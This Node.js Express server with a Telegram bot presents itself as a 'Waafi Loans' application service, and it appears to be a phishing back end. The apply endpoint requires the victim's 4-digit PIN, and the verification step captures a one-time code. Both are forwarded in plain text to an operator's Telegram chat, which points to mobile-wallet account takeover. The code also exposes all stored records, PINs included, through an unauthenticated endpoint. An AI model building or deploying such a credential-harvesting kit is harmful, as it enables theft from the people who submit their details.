const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// Initialize Telegram Bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// In-memory storage (use Redis/DB in production)
const applications = new Map();
const otps = new Map();

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Serve static files from public folder
app.use(express.static(path.join(__dirname, 'public')));

// ==================== TELEGRAM BOT COMMANDS ====================

// Start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        '👋 Welcome to Waafi Loans Admin Bot!\n\n' +
        'You will receive loan applications here.\n\n' +
        'Commands:\n' +
        '/pending - View pending applications\n' +
        '/approved - View approved loans\n' +
        '/declined - View declined loans\n' +
        '/help - Show help'
    );
});

// Help command
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId,
        '📋 *Waafi Loans Admin Commands*\n\n' +
        '/pending - List all pending applications\n' +
        '/approved - List approved loans\n' +
        '/declined - List declined loans\n' +
        '/status {application_id} - Check specific application\n\n' +
        'When you receive an application, use:\n' +
        '✅ Approve: Click the "✅ Approve" button\n' +
        '❌ Decline: Click the "❌ Decline" button\n' +
        '👁 View: Click the "👁 View Details" button',
        { parse_mode: 'Markdown' }
    );
});

// Pending applications
bot.onText(/\/pending/, (msg) => {
    const chatId = msg.chat.id;
    const pending = Array.from(applications.values()).filter(a => a.status === 'pending');

    if (pending.length === 0) {
        bot.sendMessage(chatId, '📭 No pending applications.');
        return;
    }

    pending.forEach(app => {
        sendApplicationToAdmin(app);
    });
});

// Approved applications
bot.onText(/\/approved/, (msg) => {
    const chatId = msg.chat.id;
    const approved = Array.from(applications.values()).filter(a => a.status === 'approved');

    if (approved.length === 0) {
        bot.sendMessage(chatId, '✅ No approved loans yet.');
        return;
    }

    approved.forEach(app => {
        bot.sendMessage(chatId, 
            `✅ *APPROVED LOAN*\n` +
            `ID: \`${app.id}\`\n` +
            `Name: ${app.firstName} ${app.lastName}\n` +
            `Amount: $${app.loanAmount}\n` +
            `Duration: ${app.loanDuration} months\n` +
            `Phone: ${app.phone}\n` +
            `Date: ${app.submittedAt}`,
            { parse_mode: 'Markdown' }
        );
    });
});

// Declined applications
bot.onText(/\/declined/, (msg) => {
    const chatId = msg.chat.id;
    const declined = Array.from(applications.values()).filter(a => a.status === 'declined');

    if (declined.length === 0) {
        bot.sendMessage(chatId, '❌ No declined loans.');
        return;
    }

    declined.forEach(app => {
        bot.sendMessage(chatId, 
            `❌ *DECLINED LOAN*\n` +
            `ID: \`${app.id}\`\n` +
            `Name: ${app.firstName} ${app.lastName}\n` +
            `Amount: $${app.loanAmount}\n` +
            `Phone: ${app.phone}\n` +
            `Date: ${app.submittedAt}`,
            { parse_mode: 'Markdown' }
        );
    });
});

// ==================== CALLBACK QUERIES (Approve/Decline) ====================

bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;

    // Parse action and application ID
    const [action, appId] = data.split(':');
    const app = applications.get(appId);

    if (!app) {
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found!' });
        return;
    }

    if (action === 'approve') {
        app.status = 'approved';
        app.decidedAt = new Date().toISOString();
        app.decidedBy = chatId;

        // Generate OTP for client
        const otp = generateOTP();
        otps.set(app.phone, { otp, appId, expiresAt: Date.now() + 10 * 60 * 1000 }); // 10 min expiry

        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Loan Approved! OTP sent to client.' });

        // Edit original message
        bot.editMessageText(
            `✅ *LOAN APPROVED*\n\n` + formatApplication(app) +
            `\n\n📱 OTP sent to client's phone: ${app.phone}`,
            {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'Markdown'
            }
        );

        // Notify client (in real app, send SMS here)
        console.log(`📲 OTP for ${app.phone}: ${otp}`);

    } else if (action === 'decline') {
        app.status = 'declined';
        app.decidedAt = new Date().toISOString();
        app.decidedBy = chatId;

        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Loan Declined.' });

        bot.editMessageText(
            `❌ *LOAN DECLINED*\n\n` + formatApplication(app),
            {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'Markdown'
            }
        );

    } else if (action === 'view') {
        bot.answerCallbackQuery(callbackQuery.id, { text: '👁 Viewing details...' });
    }
});

// ==================== HELPER FUNCTIONS ====================

function generateOTP() {
    return Math.floor(10000 + Math.random() * 90000).toString(); // 5-digit OTP
}

function formatApplication(app) {
    return (
        `📝 *Loan Application*\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 *Name:* ${app.firstName} ${app.lastName}\n` +
        `📞 *Phone:* ${app.phone}\n` +
        `💰 *Loan Amount:* $${app.loanAmount}\n` +
        `📅 *Duration:* ${app.loanDuration} months\n` +
        `📊 *Interest:* 2.5%/month\n` +
        `💵 *Monthly Payment:* $${app.monthlyPayment}\n` +
        `🔢 *PIN:* ${app.pin}\n` +
        `🏷 *Loan Type:* ${app.loanType}\n` +
        `📝 *Purpose:* ${app.purpose || 'N/A'}\n` +
        `⏰ *Submitted:* ${app.submittedAt}\n` +
        `🆔 *ID:* \`${app.id}\``
    );
}

function sendApplicationToAdmin(app) {
    const keyboard = {
        inline_keyboard: [
            [
                { text: '✅ Approve', callback_data: `approve:${app.id}` },
                { text: '❌ Decline', callback_data: `decline:${app.id}` }
            ],
            [
                { text: '👁 View Details', callback_data: `view:${app.id}` }
            ]
        ]
    };

    bot.sendMessage(ADMIN_CHAT_ID, formatApplication(app), {
        parse_mode: 'Markdown',
        reply_markup: keyboard
    });
}

// ==================== API ENDPOINTS ====================

// Step 1: Submit loan application (with PIN)
app.post('/api/apply', (req, res) => {
    const {
        firstName,
        lastName,
        phone,
        loanAmount,
        loanDuration,
        loanType,
        purpose,
        pin
    } = req.body;

    // Validate
    if (!firstName || !lastName || !phone || !loanAmount || !loanDuration || !pin) {
        return res.status(400).json({ success: false, message: 'All fields required' });
    }

    if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
        return res.status(400).json({ success: false, message: 'PIN must be 4 digits' });
    }

    // Calculate monthly payment
    const totalInterest = loanAmount * 0.025 * loanDuration;
    const totalRepayment = parseFloat(loanAmount) + totalInterest;
    const monthlyPayment = (totalRepayment / loanDuration).toFixed(2);

    const appId = uuidv4();
    const application = {
        id: appId,
        firstName,
        lastName,
        phone,
        loanAmount,
        loanDuration,
        loanType: loanType || 'Not specified',
        purpose: purpose || 'Not specified',
        pin,
        monthlyPayment,
        status: 'pending',
        submittedAt: new Date().toISOString(),
        otp: null,
        otpVerified: false
    };

    applications.set(appId, application);

    // Send to Telegram
    sendApplicationToAdmin(application);

    res.json({ 
        success: true, 
        message: 'Application submitted successfully',
        applicationId: appId
    });
});

// Step 2: Admin approves -> Generate OTP
app.post('/api/generate-otp', (req, res) => {
    const { applicationId, adminToken } = req.body;

    // In production, verify adminToken

    const app = applications.get(applicationId);
    if (!app) {
        return res.status(404).json({ success: false, message: 'Application not found' });
    }

    const otp = generateOTP();
    otps.set(app.phone, { 
        otp, 
        appId: applicationId, 
        expiresAt: Date.now() + 10 * 60 * 1000 
    });

    // In real app, send SMS here using Twilio or similar
    console.log(`📲 OTP for ${app.phone}: ${otp}`);

    res.json({ 
        success: true, 
        message: 'OTP generated and sent',
        // Remove in production - only for testing
        testOtp: otp 
    });
});

// Step 3: Verify OTP
app.post('/api/verify-otp', (req, res) => {
    const { phone, otp, applicationId } = req.body;

    const stored = otps.get(phone);

    if (!stored) {
        return res.status(400).json({ success: false, message: 'No OTP found. Request new one.' });
    }

    if (Date.now() > stored.expiresAt) {
        otps.delete(phone);
        return res.status(400).json({ success: false, message: 'OTP expired. Request new one.' });
    }

    if (stored.otp !== otp) {
        return res.status(400).json({ success: false, message: 'Invalid OTP' });
    }

    if (stored.appId !== applicationId) {
        return res.status(400).json({ success: false, message: 'OTP does not match application' });
    }

    // Mark as verified
    const app = applications.get(applicationId);
    app.otp = otp;
    app.otpVerified = true;
    app.verifiedAt = new Date().toISOString();

    // Clean up OTP
    otps.delete(phone);

    // Send final confirmation to Telegram with ALL details
    bot.sendMessage(ADMIN_CHAT_ID, 
        `🎉 *LOAN FULLY PROCESSED*\n\n` +
        formatApplication(app) +
        `\n\n🔐 *OTP Verified:* ${otp}\n` +
        `✅ *Status:* COMPLETE\n` +
        `⏰ *Verified At:* ${app.verifiedAt}`,
        { parse_mode: 'Markdown' }
    );

    res.json({ 
        success: true, 
        message: 'OTP verified. Loan approved and processed!',
        application: {
            id: app.id,
            name: `${app.firstName} ${app.lastName}`,
            amount: app.loanAmount,
            duration: app.loanDuration,
            monthlyPayment: app.monthlyPayment,
            status: 'complete'
        }
    });
});

// Check application status
app.get('/api/status/:id', (req, res) => {
    const app = applications.get(req.params.id);
    if (!app) {
        return res.status(404).json({ success: false, message: 'Not found' });
    }

    res.json({
        success: true,
        status: app.status,
        otpVerified: app.otpVerified
    });
});

// Resend OTP
app.post('/api/resend-otp', (req, res) => {
    const { phone, applicationId } = req.body;
    const app = applications.get(applicationId);

    if (!app) {
        return res.status(404).json({ success: false, message: 'Application not found' });
    }

    const otp = generateOTP();
    otps.set(phone, { 
        otp, 
        appId: applicationId, 
        expiresAt: Date.now() + 10 * 60 * 1000 
    });

    console.log(`📲 Resent OTP for ${phone}: ${otp}`);

    res.json({ success: true, message: 'OTP resent', testOtp: otp });
});

// Get all applications (admin)
app.get('/api/applications', (req, res) => {
    const allApps = Array.from(applications.values());
    res.json({ success: true, count: allApps.length, applications: allApps });
});

// ==================== FALLBACK ROUTE (Serve index.html for all non-API routes) ====================

// This ensures the SPA (Single Page Application) works correctly
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ==================== START SERVER ====================

app.listen(PORT, () => {
    console.log(`🚀 Waafi Loans Server running on http://localhost:${PORT}`);
    console.log(`🤖 Telegram Bot active`);
    console.log(`📁 Open http://localhost:${PORT} in your browser`);
});
